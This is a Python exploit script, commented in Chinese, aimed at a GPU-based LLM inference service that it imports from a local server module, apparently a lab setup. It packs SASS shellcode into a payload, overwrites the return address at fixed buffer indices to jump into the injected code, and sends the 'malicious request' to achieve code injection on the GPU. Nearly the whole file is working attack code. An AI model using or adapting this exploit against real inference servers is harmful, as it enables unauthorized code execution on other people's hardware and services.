import struct
import numpy as np
from server import service # 导入上面的服务器实例

def run_attack():
    print("="*50)
    print("ATTACK START: Targeting Cloud LLM Service")
    print("="*50)

    # =========================================================
    # 1. 准备 Shellcode (机器码)
    # =========================================================
    # 【请替换】这里填入你 extract_sass.py 输出的数组
    shellcode_raw = [
        0xfe400078e00ff, 0xa00ff017624, # Inst 0
        0xfe200078e00ff, 0xdeadbeefff057424, # Inst 1
        0xfe20000000f00, 0x580000027a02, # Inst 2
        0xfe20000000a00, 0x460000047ab9, # Inst 3
        0xfca0000000f00, 0x590000037a02, # Inst 4
        0xfe2000c101904, 0x502007986, # Inst 5
        0xfea0003800000, 0x794d, # Inst 6
        0xfc0000383ffff, 0xfffffff000007947, # Inst 7
        0xfc00000000000, 0x7918, # Inst 8
        0xfc00000000000, 0x7918, # Inst 9
        0xfc00000000000, 0x7918, # Inst 10
        0xfc00000000000, 0x7918, # Inst 11
        0xfc00000000000, 0x7918, # Inst 12
        0xfc00000000000, 0x7918, # Inst 13
        0xfc00000000000, 0x7918, # Inst 14
        0xfc00000000000, 0x7918, # Inst 15
    ]
    
    if not shellcode_raw:
        print("[Error] Please fill in shellcode_raw inside attack.py!")
        return

    # 将 64位 整数转换为 32位 整数列表
    shellcode_ints = []
    for val64 in shellcode_raw:
        shellcode_ints.append(val64 & 0xFFFFFFFF)          # Low 32
        shellcode_ints.append((val64 >> 32) & 0xFFFFFFFF)  # High 32
        
    print(f"[*] Shellcode prepared: {len(shellcode_ints)*4} bytes")

    # =========================================================
    # 2. 构造 Payload (Jump-over 修正版)
    # =========================================================
    
    # 我们把 Shellcode 放在偏移量 32 的位置 (跳过前面的 Padding 和 返回地址)
    shellcode_offset_ints = 32
    
    # Payload 总大小 = 偏移量 + Shellcode长度
    payload_size = shellcode_offset_ints + len(shellcode_ints)
    payload = np.zeros(payload_size, dtype=np.int32)

    # A. 填入 Shellcode (放在后面！)
    # 此时 Input Buffer 的结构: [Padding ... RET ... Padding ... Shellcode]
    for i in range(len(shellcode_ints)):
        payload[shellcode_offset_ints + i] = shellcode_ints[i]

    # B. 获取目标地址
    # 修复点：使用 .value 获取整数地址
    if service.d_input.value is None:
        print("[Error] d_input is None. CUDA Malloc failed?")
        return

    target_jump_addr = service.d_input.value + (shellcode_offset_ints * 4)
    
    print(f"[*] Base Input Addr: {hex(service.d_input.value)}")
    print(f"[*] Shellcode will be located at: {hex(target_jump_addr)}")

    # C. 覆盖返回地址 (Index 21 & 22)
    # 将返回地址指向 target_jump_addr
    # 注意：这里的 index 21 是基于之前的计算 (84 bytes / 4 = 21)
    payload[21] = target_jump_addr & 0xFFFFFFFF
    payload[22] = (target_jump_addr >> 32) & 0xFFFFFFFF

    print(f"[*] Overwriting Return Address at index 21/22 -> Jump to {hex(target_jump_addr)}")

    # =========================================================
    # 3. 发送恶意请求
    # =========================================================
    print("[*] Sending malicious request to Server...")
    
    try:
        # 我们发送列表格式给服务器
        result, _, _ = service.inference(payload.tolist())
        
        print("[*] Request finished.")
        # 打印前 16 个结果
        print(f"[*] Output (First 16): {result[:16]}")
        
        print("\n[SUCCESS] If you see this message and NO CUDA Error, Code Injection worked!")
        print("          The GPU executed your data as code (EXIT instruction).")

    except Exception as e:
        print(f"[FAIL] Server crashed or attack failed: {e}")

if __name__ == "__main__":
    run_attack()